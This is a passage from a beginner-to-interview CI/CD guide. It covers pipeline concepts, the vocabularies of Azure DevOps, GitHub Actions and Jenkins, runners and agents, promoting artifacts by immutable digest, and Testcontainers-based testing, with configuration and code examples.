# 📖 The CI/CD Guide — Every Concept, From Zero

> **Read this before touching any of the three case files.** It explains *what* a pipeline is and *why* each piece exists, so that when Azure DevOps calls it a "stage", GitHub Actions calls it a "job", and Jenkins calls it a "stage", you know they're the same idea wearing different hats.
>
> **Audience:** complete beginner → interview-ready.
> **Time:** 3–4 hours of reading. Skim what you know; read §6 (secrets), §9 (deployment strategies), §11 (supply chain) and §12 (pipeline security) in full — those are where the senior-level questions live.

---

## Contents

| § | Topic |
|---|---|
| [1](#1--what-ci-and-cd-actually-mean) | What CI and CD actually mean (three things, not two) |
| [2](#2--the-anatomy-of-a-pipeline) | The anatomy of a pipeline — and the three tools' vocabularies mapped |
| [3](#3--where-the-code-runs-agents-runners-executors) | Where the code runs: agents, runners, executors |
| [4](#4--build-once-promote-many) | Build once, promote many — the artifact rule |
| [5](#5--testing-in-a-pipeline) | Testing in a pipeline: the pyramid, Testcontainers, flaky tests |
| [6](#6--secrets-the-ladder-from-bad-to-good) | ⭐ Secrets: the ladder from bad to good |
| [7](#7--branching-strategies-and-how-they-shape-pipelines) | Branching strategies and how they shape pipelines |
| [8](#8--environments-approvals-and-gates) | Environments, approvals and gates |
| [9](#9--deployment-strategies) | ⭐ Deployment strategies: rolling, blue-green, canary, progressive |
| [10](#10--gitops-push-vs-pull) | GitOps: push vs pull |
| [11](#11--software-supply-chain-security) | ⭐ Software supply chain security: SBOM, provenance, SLSA, signing |
| [12](#12--pipeline-security--the-attack-surface-) | ⭐⭐ Pipeline security: the attack surface |
| [13](#13--caching--the-only-thing-that-makes-pipelines-fast) | Caching — the only thing that makes pipelines fast |
| [14](#14--dora-metrics-measuring-your-pipeline) | DORA metrics: measuring your pipeline |
| [15](#15--choosing-a-tool-the-honest-comparison) | Choosing a tool: the honest comparison |
| [16](#16--migrating-between-tools) | Migrating between tools |
| [17](#17--the-20-mistakes-that-cost-the-most) | The 20 mistakes that cost the most |

---

<a name="1--what-ci-and-cd-actually-mean"></a>
## 1 · What CI and CD actually mean

People say "CI/CD" as one word. It's **three** distinct things, and confusing them is the source of most bad pipelines.

```
┌─────────────────────────────────────────────────────────────────────────────┐
│                                                                             │
│   CI  —  CONTINUOUS INTEGRATION                                             │
│   ─────────────────────────────                                             │
│   Every commit is BUILT and TESTED automatically, on a branch, before it    │
│   can merge. The goal is to find out that your change is broken in          │
│   MINUTES, by a machine, rather than in DAYS, by a colleague.               │
│                                                                             │
│   Output: a verified, tested, packaged ARTIFACT (an image, a jar, a zip).   │
│                                                                             │
│         │                                                                   │
│         ▼                                                                   │
│                                                                             │
│   CD  —  CONTINUOUS DELIVERY                                                │
│   ──────────────────────────                                                │
│   The artifact is automatically deployed to environments UP TO a gate,      │
│   and is ALWAYS in a state where a human could press "deploy to production" │
│   and it would work. The human decides WHEN.                                │
│                                                                             │
│         │                                                                   │
│         ▼                                                                   │
│                                                                             │
│   CD  —  CONTINUOUS DEPLOYMENT                                              │
│   ─────────────────────────────                                             │
│   The artifact goes to production with NO human in the loop. Every commit   │
│   that passes the pipeline is live within minutes.                          │
│                                                                             │
└─────────────────────────────────────────────────────────────────────────────┘
```

**The distinction that matters:** *Continuous Delivery* means "we could ship right now, safely, if we chose to." *Continuous Deployment* means "we do ship, automatically, every time."

| | Continuous Delivery | Continuous Deployment |
|---|---|---|
| Production deploy | A human clicks "approve" | Automatic |
| Requires | Good tests, an approval gate | **Everything Delivery requires, plus** automated canary analysis, instant rollback, feature flags, and an observability platform that tells you within minutes |
| Typical of | Banks, healthcare, most enterprises | Netflix, Etsy, high-volume SaaS |
| Failure cost | Low (a human caught it) | ⚠️ High — a bad commit reaches 100% of users |

> 🔑 **You cannot have Continuous Deployment without excellent observability.** If a bad deploy reaches production automatically, the *only* thing standing between you and an outage is an automated rollback triggered by a metric. That's why the [Monitoring path](../monitoring-alerting-learning-path/) comes before this one in a real curriculum, and why the capstone here wires the pipeline to Prometheus.

### 1.1 Why CI exists — the actual history

Before CI (roughly pre-2005), teams worked on long-lived branches for weeks and then merged. The merge was called **"integration hell"**: two weeks of divergent code, thousands of conflicts, days of debugging other people's changes, and no way to know which of 200 commits broke the build.

CI's insight is brutally simple: **integrate constantly, in tiny increments, so each integration is small enough to understand.**

| | Long-lived branches | Trunk-based / CI |
|---|---|---|
| Merge size | 2 weeks of divergence | Minutes of divergence |
| Time to find a break | Days | ⭐ Minutes |
| Who broke it | Anyone — 200 commits to bisect | One commit, one author |
| Refactoring | Terrifying | Routine |
| Release | A big-bang event | A boring Tuesday |

**The rules of CI** (these are not optional; a pipeline without them is just a build server):

1. **Every commit triggers a build.** Not every push to `main` — every commit on every branch and every PR.
2. **The build is fast.** Under 10 minutes for the inner loop, or people stop waiting for it and merge anyway.
3. **The build fails loudly.** A red build blocks the merge. No "we'll fix it later."
4. **The build environment matches production.** Same OS, same dependency versions, same database engine. ⭐ This is what containers are for.
5. **Every build produces an artifact.** Not "it compiled" — a *thing* you can deploy.
6. **The build is reproducible.** The same commit produces the same artifact, byte for byte (see §11).
7. **Anyone can see the build status.** It's not the CI team's private dashboard.

### 1.2 The pipeline you'll build in all three cases

```
   git push / pull_request
            │
            ▼
   ┌────────────────────┐
   │ 1. LINT & FORMAT   │  30s   golangci-lint, ruff, eslint, ktlint, hadolint, yamllint
   └─────────┬──────────┘        ⭐ fail fast: the cheapest check first
             ▼
   ┌────────────────────┐
   │ 2. UNIT TEST       │  3m    mvn test, go test, pytest, vitest
   └─────────┬──────────┘        parallelised, cached dependencies
             ▼
   ┌────────────────────┐
   │ 3. BUILD IMAGE     │  2m    multi-stage Dockerfile, BuildKit cache, distroless
   └─────────┬──────────┘        ⭐ reproducible: pinned digests, no :latest
             ▼
   ┌────────────────────┐
   │ 4. SCAN            │  2m    Trivy (image), Semgrep (code), gitleaks (secrets),
   └─────────┬──────────┘        dependency audit, SBOM generation
             ▼
   ┌────────────────────┐
   │ 5. INTEGRATION     │  5m    Testcontainers: real Postgres/Redis/RabbitMQ
   └─────────┬──────────┘        ⭐ or a docker-compose service set
             ▼
   ┌────────────────────┐
   │ 6. PUSH + ATTEST   │  1m    push to the registry, sign with cosign,
   └─────────┬──────────┘        attach the SBOM and provenance attestation
             ▼
   ┌────────────────────┐
   │ 7. DEPLOY → dev    │  2m    helm upgrade, automatic
   └─────────┬──────────┘
             ▼
   ┌────────────────────┐
   │ 8. SMOKE TEST      │  2m    hit the real endpoints, assert the responses
   └─────────┬──────────┘        ⭐ and assert the observability platform sees it
             ▼
   ┌────────────────────┐
   │ 9. DEPLOY → staging│  2m    automatic, with the promoted artifact
   └─────────┬──────────┘        ⭐ NOT rebuilt. The SAME digest.
             ▼
   ┌────────────────────┐
   │10. E2E / CONTRACT  │  8m    Playwright against staging
   └─────────┬──────────┘
             ▼
   ┌────────────────────┐
   │11. ⏸  APPROVE      │  —     a human, with a deployment window and a checklist
   └─────────┬──────────┘
             ▼
   ┌────────────────────┐
   │12. DEPLOY → prod   │  3m    canary 10% → analyse metrics → 50% → 100%
   └─────────┬──────────┘        automatic rollback on SLO burn
             ▼
   ┌────────────────────┐
   │13. VERIFY & REPORT │  1m    assert the version, record DORA metrics, notify
   └────────────────────┘
```

**Total: ~30 minutes for the full promotion path, ~10 minutes for the PR inner loop** (steps 1–5 only, run in parallel).

⭐ **The single most important structural rule in that diagram:** step 9 deploys **the same image digest** that step 6 pushed and step 7 deployed to dev. It does not rebuild. If you rebuild per environment, you are not testing the thing you ship — you're testing three different things that happen to come from the same source. See §4.

---

<a name="2--the-anatomy-of-a-pipeline"></a>
## 2 · The anatomy of a pipeline

### 2.1 The universal structure

Every CI system, without exception, has these five concepts:

```
TRIGGER        what starts it          (a push, a PR, a schedule, a manual click, an API call)
    │
    ▼
STAGE          a phase with a gate     (build, then test, then deploy — a stage boundary
    │                                   is where you can stop and require approval)
    ▼
JOB            a unit of execution     (runs on ONE machine, in ONE workspace,
    │                                   start to finish, in isolation from other jobs)
    ▼
STEP           one command             (a shell command, or a call to a reusable
    │                                   task/action/plugin)
    ▼
ARTIFACT       what survives the job   (a file, an image, a report — passed to later jobs
                                        or to the outside world)
```

**The critical mental model: a JOB is a fresh machine.** Everything in it is lost when the job ends. Jobs cannot share a filesystem. Anything a later job needs must be an **artifact** (uploaded and downloaded) or live in an **external system** (a registry, a cache, a database).

This is the #1 thing beginners get wrong:

```yaml
# ⛔ THIS DOES NOT WORK — in any of the three tools
jobs:
  build:
    steps:
      - run: mvn package            # creates target/app.jar
  deploy:
    needs: build
    steps:
      - run: kubectl apply -f target/app.yaml    # ⛔ target/ DOES NOT EXIST HERE
```

```yaml
# ✅ the fix: an artifact crosses the job boundary
jobs:
  build:
    steps:
      - run: mvn package
      - uses: actions/upload-artifact@v4
        with: {name: jar, path: target/app.jar}
  deploy:
    needs: build
    steps:
      - uses: actions/download-artifact@v4
        with: {name: jar}
      - run: kubectl apply -f app.yaml
```

### 2.2 The three vocabularies, mapped ⭐⭐

This table is the whole reason to learn all three. **Learn it and you can read any pipeline in any tool.**

| Concept | **Azure DevOps** | **GitHub Actions** | **Jenkins** |
|---|---|---|---|
| The whole thing | Pipeline | Workflow | Pipeline (Job) |
| The config file | `azure-pipelines.yml` | `.github/workflows/*.yml` | `Jenkinsfile` |
| The config language | YAML | YAML | **Groovy** (declarative or scripted) |
| A phase with a gate | **Stage** | *(no direct equivalent — use `needs` + environments)* | **Stage** |
| A unit of execution | **Job** | **Job** | *(a stage runs on one node; `parallel{}` creates branches)* |
| One command | **Step** | **Step** | **Step** |
| A reusable step | **Task** (`Bash@3`, `Docker@2`) | **Action** (`actions/checkout@v7`) | **Plugin step** (`sh`, `docker.build`) |
| A reusable set of steps | **Template** (`extends`, `jobs:`) | **Composite action** or **reusable workflow** | **Shared library** (`vars/*.groovy`) |
| The machine | **Agent** (pool) | **Runner** | **Node** / **Agent** / **Executor** |
| The workspace | `$(Pipeline.Workspace)` | `$GITHUB_WORKSPACE` | `$WORKSPACE` |
| The source dir | `$(Build.SourcesDirectory)` | `$GITHUB_WORKSPACE` | `$WORKSPACE` |
| A secret | **Variable group** / library secret | **Secret** / environment secret | **Credentials** binding |
| A non-secret variable | **Variable** (pipeline / group / YAML) | **`env:`** / `vars` | **`environment{}`** / params |
| Passing data between jobs | `##vso[task.setvariable …;isOutput=true]` | `$GITHUB_OUTPUT` | a `return` value from a `script{}` block, or a file |
| Conditional execution | `condition:` | `if:` | `when { }` |
| A loop over variations | `strategy: matrix:` | `strategy: matrix:` | `matrix { }` (declarative) |
| Manual approval | ⭐ **Environment → Approvals and checks** | **Environment → Required reviewers** | ⭐ `input` step, or the Lockable Resources plugin |
| A deploy target | **Environment** | **Environment** | *(none built in — model it yourself)* |
| Artifact storage | **Azure Artifacts** / Pipeline Artifacts | **Artifacts** / GitHub Packages | **archiveArtifacts** / Artifactory / Nexus |
| Container images | **Azure Container Registry** | **GHCR** | any registry |
| Trigger on push | `trigger:` | `on: push:` | `pollSCM` / webhook / multibranch |
| Trigger on PR | `pr:` | `on: pull_request:` | multibranch + `when { changeset }` |
| Scheduled | `schedules:` | `on: schedule: cron:` | `triggers { cron(…) }` |
| The run's identity | `$(Build.BuildId)` | `${{ github.run_id }}` | `${env.BUILD_NUMBER}` |
| The commit | `$(Build.SourceVersion)` | `${{ github.sha }}` | `${env.GIT_COMMIT}` |
| Cancel superseded runs | `strategy: runAfter` / auto-cancel setting | `concurrency: {cancel-in-progress: true}` | the Disable Concurrent Builds option |
| Where the UI lives | Pipelines → Runs | the Actions tab | Blue Ocean / the classic UI |

**The one structural difference worth memorising:**

```
Azure DevOps:   Stage ──► Job ──► Step        ⭐ three levels, and stages have gates
GitHub Actions: Job     ──► Step              ⭐ TWO levels only. No stages.
                                               You emulate a stage with `needs:` +
                                               an `environment:` on the last job.
Jenkins:        Stage   ──► Step              ⭐ two levels, but a stage can contain
                                               `parallel { }` which behaves like jobs.
```

So when a GitHub Actions user says "I need a stage gate", the answer is: **an `environment:` with required reviewers, on a job that `needs:` everything else.** When an Azure DevOps user moves to GitHub Actions, the thing they miss most is the stage.

### 2.3 A side-by-side "hello world" in all three

**Azure DevOps** — `azure-pipelines.yml`:

```yaml
trigger:
  branches: {include: [main]}
  paths: {include: [src/*]}

pool:
  vmImage: ubuntu-latest

variables:
  - group: shop-common                 # ⭐ a variable group from the Library
  - name: GO_VERSION
    value: '1.23'

stages:
  - stage: Build
    displayName: 🏗️ Build and test
    jobs:
      - job: Test
        displayName: Unit tests
        timeoutInMinutes: 15
        steps:
          - checkout: self
            fetchDepth: 0              # ⭐ full history, needed for changelogs
          - task: GoTool@0
            inputs: {version: '$(GO_VERSION)'}
          - script: go test ./... -race -coverprofile=cover.out
            displayName: Run tests
          - publish: cover.out
            artifact: coverage
            displayName: Publish coverage
```

**GitHub Actions** — `.github/workflows/ci.yml`:

```yaml
name: CI

on:
  push:      {branches: [main], paths: ['src/**']}
  pull_request: {branches: [main]}

env:
  GO_VERSION: '1.23'

jobs:
  test:
    name: 🧪 Unit tests
    runs-on: ubuntu-latest            # ⭐ = Ubuntu 24.04, 2 CPU / 7 GB
    timeout-minutes: 15
    steps:
      - uses: actions/checkout@v7
        with: {fetch-depth: 0}
      - uses: actions/setup-go@v6
        with: {go-version: '${{ env.GO_VERSION }}', cache: true}
      - run: go test ./... -race -coverprofile=cover.out
      - uses: actions/upload-artifact@v4
        if: always()                   # ⭐ upload even on failure
        with: {name: coverage, path: cover.out}
```

**Jenkins** — `Jenkinsfile`:

```groovy
pipeline {
  agent any                            // ⭐ or: agent { kubernetes { yaml … } }

  environment {
    GO_VERSION = '1.23'
  }

  options {
    timeout(time: 15, unit: 'MINUTES')
    buildDiscarder(logRotator(numToKeepStr: '30'))
    disableConcurrentBuilds()
    timestamps()
  }

  triggers {
    pollSCM('H/2 * * * *')             // ⭐ or a webhook from GitHub
  }

  stages {
    stage('🧪 Unit tests') {
      steps {
        checkout scm
        sh "go test ./... -race -coverprofile=cover.out"
      }
      post {
        always { archiveArtifacts artifacts: 'cover.out', allowEmptyArchive: true }
      }
    }
  }
}
```

**Read those three side by side twice.** Everything else in this path is elaboration.

### 2.4 Triggers

| Trigger | Azure DevOps | GitHub Actions | Jenkins |
|---|---|---|---|
| Push to a branch | `trigger: branches: include:` | `on: push: branches:` | webhook or `pollSCM` |
| Pull request | `pr:` | `on: pull_request:` | multibranch pipeline |
| Schedule | `schedules: - cron:` | `on: schedule: - cron:` | `triggers { cron('H 2 * * *') }` |
| Manual | the Run pipeline button / `resources` | `on: workflow_dispatch:` with `inputs:` | Build with Parameters |
| Another pipeline | `resources: pipelines:` | `on: workflow_run:` | `build job: 'other'` |
| An artifact published | `resources: containers:` | — | — |
| A container image | `resources: containers:` | — | — |
| An external webhook | a service hook | `on: repository_dispatch:` | the Generic Webhook Trigger plugin |
| A release/PR merged | `pr:` + a branch filter | `on: pull_request: types: [closed]` | — |

```yaml
# ⭐ GitHub Actions: workflow_dispatch with typed inputs — the "run it by hand" button
on:
  workflow_dispatch:
    inputs:
      environment:
        description: The target environment
        type: choice
        required: true
        default: staging
        options: [dev, staging, production]
      version:
        description: An explicit image tag (blank = the git SHA)
        type: string
        required: false
      dry_run:
        description: Render the manifests but don't apply them
        type: boolean
        default: false
```

```yaml
# ⭐ Azure DevOps: runtime parameters, the same idea
parameters:
  - name: environment
    displayName: Target environment
    type: string
    default: staging
    values: [dev, staging, production]
  - name: version
    type: string
    default: ''
  - name: dryRun
    type: boolean
    default: false
```

```groovy
// ⭐ Jenkins: parameters
properties([
  parameters([
    choice(name: 'ENVIRONMENT', choices: ['dev','staging','production'], description: 'Target'),
    string(name: 'VERSION', defaultValue: '', description: 'Explicit image tag'),
    booleanParam(name: 'DRY_RUN', defaultValue: false)
  ])
])
```

**`cron` gotcha:** GitHub Actions and Azure DevOps cron runs in **UTC**, not your local time. And a scheduled workflow only runs on the **default branch's** copy of the file. And Jenkins' `H` (hash) syntax exists to stop 500 jobs all firing at exactly 02:00 — use `H 2 * * *`, never `0 2 * * *`.

---

<a name="3--where-the-code-runs-agents-runners-and-executors"></a>
## 3 · Where the code runs: agents, runners, executors

### 3.1 Hosted vs self-hosted

| | **Hosted** (Microsoft/GitHub-provided) | **Self-hosted** (yours) |
|---|---|---|
| Setup | Zero | ⭐ You install, patch, monitor and scale it |
| Cleanliness | A brand-new VM per job | ⚠️ State persists between jobs unless you clean it |
| Speed | Cold start ~5–15 s | Warm start ~1 s |
| Network | Public internet; reaching your VNet needs a private link | ⭐ Inside your network — can reach your databases |
| Hardware | Fixed (2–4 CPU, 7–16 GB); larger SKUs cost more | Anything, including GPUs |
| Cost | Per-minute after a free allowance | The machine, plus your ops time |
| Security | ⭐ Isolated, ephemeral — safe for public/PR builds | ⚠️ **Dangerous for PR builds from forks** (see §12) |
| Best for | The default choice | Air-gapped, private networks, GPU, very long builds, very high volume |

```
GitHub-hosted runner images (2026):
  ubuntu-latest   → Ubuntu 24.04          2 CPU / 7 GB RAM / 14 GB SSD (private repos)
  ubuntu-22.04    → Ubuntu 22.04          4 CPU / 16 GB (public repos)
  ubuntu-slim     → a minimal preview image
  windows-latest  → Windows Server 2025
  windows-2022    → Windows Server 2022
  macos-latest    → macOS 15 (arm64)
  macos-15-large  → macOS 15 (x64)
  macos-26        → macOS 26 (arm64, beta)
  *-xlarge / *-2xlarge / …  → bigger paid SKUs

Azure Pipelines hosted agents:
  ubuntu-latest   → Ubuntu 24.04 (the SAME images — actions/runner-images powers both)
  windows-latest, macOS-15, and Azure-managed larger SKUs
```

⭐ **The images are literally the same project** — [`actions/runner-images`](https://github.com/actions/runner-images) builds the VM images for **both** GitHub Actions and Azure Pipelines. That's why `ubuntu-latest` behaves identically in both, and why a migration between them is mostly about the YAML dialect rather than the environment.

### 3.2 Self-hosted: the three ways

**Way 1 — a VM with an agent installed**

```bash
# GitHub Actions runner
mkdir actions-runner && cd actions-runner
curl -o runner.tar.gz -L https://github.com/actions/runner/releases/download/v2.330.0/actions-runner-linux-x64-2.330.0.tar.gz
tar xzf runner.tar.gz
./config.sh --url https://github.com/OWNER/REPO --token <JIT-or-PAT-token> \
  --labels linux,x64,shop,private-net --work _work --unattended --replace
sudo ./svc.sh install && sudo ./svc.sh start
./run.sh                                    # or run in the foreground to watch

# Azure DevOps agent
curl -o agent.tar.gz -L https://vstsagentpackage.azureedge.net/agent/3.250.0/vsts-agent-linux-x64-3.250.0.tar.gz
mkdir agent && tar xzf agent.tar.gz -C agent && cd agent
./config.sh --unattended --url https://dev.azure.com/ORG --auth pat --token <PAT> \
  --pool shop-agents --agent $(hostname) --work _work --acceptTeeEula
sudo ./svc.sh install && sudo ./svc.sh start
```

**Way 2 — a Kubernetes-deployed agent pool** (the production answer)

```yaml
# GitHub: the actions-runner-controller (ARC) — GitHub's official operator
# helm repo add actions-runner-controller https://actions-runner-controller.github.io/actions-runner-controller
apiVersion: actions.summerwind.dev/v1alpha1
kind: RunnerDeployment
metadata: {name: shop-runner, namespace: arc}
spec:
  replicas: 2
  template:
    spec:
      repository: 3558Bhk/shop
      labels: [shop, k8s]
      resources:
        limits:   {cpu: "4", memory: 8Gi}
        requests: {cpu: "1", memory: 2Gi}
      dockerEnabled: true                 # ⭐ docker-in-docker sidecar
      volumeMounts:
        - {name: cache, mountPath: /tmp}
---
apiVersion: actions.summerwind.dev/v1alpha1
kind: HorizontalRunnerAutoscaler
metadata: {name: shop-runner-autoscaler, namespace: arc}
spec:
  scaleTargetRef: {name: shop-runner}
  minReplicas: 1
  maxReplicas: 20
  metrics:
    - type: TotalNumberOfQueuedAndInProgressWorkflowRuns   # ⭐ scale on queue depth
  scaleUpTriggers:
    - githubEvent: {}
      duration: 30m
```

**Way 3 — ephemeral agents, created per job** (Jenkins does this best; see Case 3)

```
the Jenkins controller receives a build
  → the Kubernetes plugin asks the cluster for a NEW pod
  → the pod contains exactly the containers that build needs
  → the build runs, the pod is DELETED
  → zero persistent state, zero idle cost, perfect isolation
```

⭐ **This is Jenkins' genuine superpower** and the main reason people keep it: an agent pool that costs nothing when idle and scales to hundreds of pods on demand, with a different toolchain per build. GitHub Actions and Azure DevOps can approximate it (ARC with scale-to-zero, Azure's managed agent pools) but Jenkins' Kubernetes plugin has done it natively since 2017.

### 3.3 Containers as the job environment

Instead of installing tools on the agent, **run the job inside a container image that already has them.**

```yaml
# Azure DevOps
jobs:
  - job: Build
    container:
      image: maven:3.9-eclipse-temurin-21
      options: "--user root -v /var/run/docker.sock:/var/run/docker.sock"
    steps:
      - script: mvn -B verify        # ⭐ Maven and Java 21 are already there

# GitHub Actions
jobs:
  build:
    runs-on: ubuntu-latest
    container: {image: 'maven:3.9-eclipse-temurin-21', options: '--user root'}
    steps:
      - run: mvn -B verify

# Jenkins — per-stage containers
pipeline {
  agent { kubernetes { yaml '''
    apiVersion: v1
    kind: Pod
    spec:
      containers:
        - {name: maven,  image: maven:3.9-eclipse-temurin-21, command: ["sleep"], args: ["infinity"]}
        - {name: golang, image: golang:1.23,                  command: ["sleep"], args: ["infinity"]}
        - {name: kubectl,image: bitnami/kubectl:1.37,         command: ["sleep"], args: ["infinity"]}
  ''' } }
  stages {
    stage('Java') { steps { container('maven')  { sh 'mvn -B verify' } } }
    stage('Go')   { steps { container('golang') { sh 'go test ./...'  } } }
    stage('Ship') { steps { container('kubectl'){ sh 'kubectl apply -f k8s/' } } }
  }
}
```

**Why this is better:** the build environment is **versioned with the code**, reproducible, and identical on a laptop and in CI. `works on my machine` stops being a sentence anyone says.

⚠️ **The Docker-in-Docker trap:** to `docker build` inside a container job, you either mount the host's Docker socket (⛔ a security hole — that socket is root on the host) or use **BuildKit rootless / kaniko / buildah**, or run the job on a VM agent with Docker installed. All three cases cover this properly.

---

<a name="4--build-once-promote-many"></a>
## 4 · Build once, promote many

### 4.1 The rule

> ⭐⭐ **Build the artifact exactly once. Promote the SAME BYTES through every environment.**

If you build in dev, build again in staging, and build a third time for production, you have three different artifacts and you have tested none of the ones you shipped.

```
⛔ WRONG — build per environment
   dev      ──► build ──► deploy ──► test
   staging  ──► build ──► deploy ──► test     three different images,
   prod     ──► build ──► deploy                all from "the same" commit

✅ RIGHT — build once, promote
   commit ──► BUILD ──► image @sha256:abc123 ──┬──► deploy to dev     ──► test
                                               ├──► deploy to staging ──► test
                                               └──► deploy to prod
   the SAME DIGEST everywhere. What you tested is what you shipped.
```

### 4.2 Immutability: promote by digest, not by tag

```bash
# ⛔ the tag mutates
registry/shop-api:staging     # today this is build 41
registry/shop-api:staging     # tomorrow this is build 42 — the SAME NAME, different bytes

# ✅ the digest is immutable
registry/shop-api@sha256:9f2a1b3c…    # this is ALWAYS build 41, forever
```

```yaml
# ⭐ the promotion pattern: retag the digest, never rebuild
- name: Promote dev → staging
  run: |
    DIGEST="${{ needs.build.outputs.digest }}"          # sha256:9f2a…
    # pull by digest, tag for staging, push the tag — NO REBUILD
    docker pull "$REGISTRY/shop-api@$DIGEST"
    docker tag  "$REGISTRY/shop-api@$DIGEST" "$REGISTRY/shop-api:staging"
    docker push "$REGISTRY/shop-api:staging"
    # ⭐ and deploy by DIGEST, so the tag race can't bite you:
    helm upgrade --install shop ./helm/shop -n shop \
      --set image.repository=$REGISTRY/shop-api \
      --set image.digest=$DIGEST \
      --set-string image.tag=""
```

```yaml
# in the Helm chart, support BOTH tag and digest
# templates/deployment.yaml
image: "{{ .Values.image.repository }}{{- if .Values.image.digest }}@{{ .Values.image.digest }}{{- else }}:{{ .Values.image.tag }}{{- end }}"
```

### 4.3 Artifact versioning schemes

| Scheme | Example | Pros | Cons |
|---|---|---|---|
| Git SHA | `sha-a1b2c3d` | ⭐ Immutable, traceable to the exact commit | Meaningless to a human |
| SemVer from a tag | `1.4.2` | Human, comparable | Requires tag discipline; the same tag can be re-pushed |
| SemVer + SHA | `1.4.2-a1b2c3d` | ⭐⭐ Both | Slightly long |
| Build number | `4417` | Simple, monotonic | Not portable across tools |
| Timestamp | `20260910-1423` | Sortable | Collides across branches |
| `latest` | `latest` | — | ⛔ **Never.** Untraceable, unrollbackable, unpredictable |
| Branch name | `main`, `staging` | Convenient for CD | ⛔ Mutates; can't roll back |

```
⭐ THE CONVENTION THAT WORKS:
   every build pushes FOUR references to the same immutable digest:
     sha-a1b2c3d          ← the immutable one you deploy
     1.4.2                ← if the commit was tagged
     main                 ← a moving pointer, for "what's on main right now"
     pr-482               ← for PR preview environments
   Deploy by the FIRST one. Never by the last three.
```

```yaml
# docker/metadata-action does all of this in one step
- uses: docker/metadata-action@v5
  id: meta
  with:
    images: ghcr.io/3558bhk/shop-api
    tags: |
      type=sha,prefix=sha-,format=short
      type=ref,event=branch
      type=ref,event=pr,prefix=pr-
      type=semver,pattern={{version}}
      type=raw,value=latest,enable={{is_default_branch}}
    labels: |
      org.opencontainers.image.title=shop-api
      org.opencontainers.image.revision={{sha}}
      org.opencontainers.image.vendor=Shop
```

### 4.4 Where artifacts live

| Artifact | Azure DevOps | GitHub | Jenkins |
|---|---|---|---|
| Build files (jars, zips, reports) | **Pipeline Artifacts** (`publish:`) — 90 days by default | **Actions artifacts** (`upload-artifact@v4`) — 90 days default, retention configurable | **`archiveArtifacts`** on the controller's disk ⚠️ |
| Packages (npm/Maven/NuGet/PyPI) | ⭐ **Azure Artifacts** — upstream sources, retention policies | **GitHub Packages** | Artifactory / Nexus via plugin |
| Container images | **ACR** (or any) | ⭐ **GHCR** (free with the repo, `GITHUB_TOKEN` works out of the box) | any |
| Helm charts | Azure Artifacts (OCI), ACR | GHCR (OCI) | any |
| Test results | **Azure Boards / Test Plans** — first-class | a summary report via `dorny/test-reporter` or annotations | ⭐ the JUnit plugin + the HTML Publisher |
| Coverage | a build tab widget | a PR comment via a third-party action | the JaCoCo/Cobertura plugins |

⚠️ **Jenkins' `archiveArtifacts` writes to the controller's disk by default.** That's how Jenkins controllers run out of space at 3 a.m. In production, archive to **S3/Artifactory/Nexus**, not to the controller — and set `buildDiscarder(logRotator(...))` on every job.

---

<a name="5--testing-in-a-pipeline"></a>
## 5 · Testing in a pipeline

### 5.1 The pyramid, mapped to pipeline stages

```
                       ╱╲
                      ╱  ╲      E2E (Playwright, Cypress)
                     ╱ ~20╲     ⏱ 8–20 min   💰💰💰   run on: staging, after deploy
                    ╱──────╲    ⚠️ flaky, slow, brittle — keep this layer SMALL
                   ╱        ╲
                  ╱ CONTRACT ╲   Consumer-driven contracts (Pact)
                 ╱   ~50      ╲  ⏱ 2–5 min   💰💰    run on: PR, per service
                ╱──────────────╲ ⭐ catches integration breaks WITHOUT the full system
               ╱                ╲
              ╱  INTEGRATION     ╲  Testcontainers: a REAL Postgres/Redis/Kafka
             ╱     ~200           ╲ ⏱ 3–8 min  💰💰   run on: PR, in parallel
            ╱──────────────────────╲ ⭐ the highest-value layer most teams skip
           ╱                        ╲
          ╱        UNIT              ╲  no I/O, no network, no sleep()
         ╱         ~2000              ╲ ⏱ 30s–3 min  💰  run on: every push
        ╱──────────────────────────────╲ ⭐ fast, deterministic, parallel
       ╱                                ╲
      ╱   STATIC: lint, typecheck, SAST   ╲ ⏱ 20–60s  💰  run FIRST, fail fast
     ╱──────────────────────────────────────╲
```

**The two rules:**
1. **The cheapest, fastest check runs first.** Lint before unit tests, unit tests before integration, integration before E2E. A syntax error should fail in 20 seconds, not after a 15-minute E2E run.
2. **The layers run in PARALLEL where they don't depend on each other.** Lint and unit tests for four services can all run at once.

### 5.2 Testcontainers — real dependencies, in CI ⭐

The single biggest quality jump you can make: stop mocking your database, start running a real one.

```xml
<!-- Java -->
<dependency>
  <groupId>org.testcontainers</groupId>
  <artifactId>junit-jupiter</artifactId><version>1.20.4</version><scope>test</scope>
</dependency>
<dependency>
  <groupId>org.testcontainers</groupId>
  <artifactId>postgresql</artifactId><version>1.20.4</version><scope>test</scope>
</dependency>
```

```java
@SpringBootTest
@Testcontainers
class OrderRepositoryTest {

    @Container
    @ServiceConnection                                   // ⭐ Spring Boot 3.1+ wires it automatically
    static PostgreSQLContainer<?> POSTGRES =
        new PostgreSQLContainer<>("postgres:17-alpine")
            .withDatabaseName("shop").withUsername("shop").withPassword("shop");

    @Container
    static GenericContainer<?> REDIS =
        new GenericContainer<>("redis:7.4-alpine").withExposedPorts(6379);

    @Autowired OrderRepository repo;

    @Test
    void savesAndFindsAnOrder() {
        Order o = repo.save(new Order(null, "ord_1", OrderState.PENDING, 4497L));
        assertThat(repo.findById(o.id()).isPresent()).isTrue();
        // ⭐ this is REAL SQL against REAL Postgres. A migration typo fails HERE,
        //   not in production.
    }
}
```

```python
# Python
import pytest
from testcontainers.postgres import PostgresContainer
from testcontainers.rabbitmq import RabbitMqContainer

@pytest.fixture(scope="session")
def postgres():
    with PostgresContainer("postgres:17-alpine", dbname="shop") as pg:
        yield pg.get_connection_url()

def test_order_persists(postgres):
    ...
```

```go
// Go
func TestOrderRepository(t *testing.T) {
    ctx := context.Background()
    pg, err := postgres.Run(ctx, "postgres:17-alpine",
        postgres.WithDatabase("shop"), postgres.WithUsername("shop"), postgres.WithPassword("shop"))
    testcontainers.CleanupContainer(t, pg)
    require.NoError(t, err)
    dsn, err := pg.ConnectionString(ctx, "sslmode=disable")
    require.NoError(t, err)
    // ⭐ real Postgres, real migrations, real SQL
}
```

**In CI, Testcontainers needs a Docker daemon.** Options, best first:

| Approach | Works on | Notes |
|---|---|---|
| ⭐ A VM/hosted agent with Docker preinstalled | all three tools | The default. `ubuntu-latest` has Docker. |
| A `container:` job with the socket mounted | Azure DevOps, GH Actions | ⚠️ mounting `/var/run/docker.sock` is root-on-host |
| `docker:dind` as a service | GH Actions (`services:`) | ⚠️ needs `privileged: true` |
| Testcontainers Cloud | anywhere | Paid, zero setup |
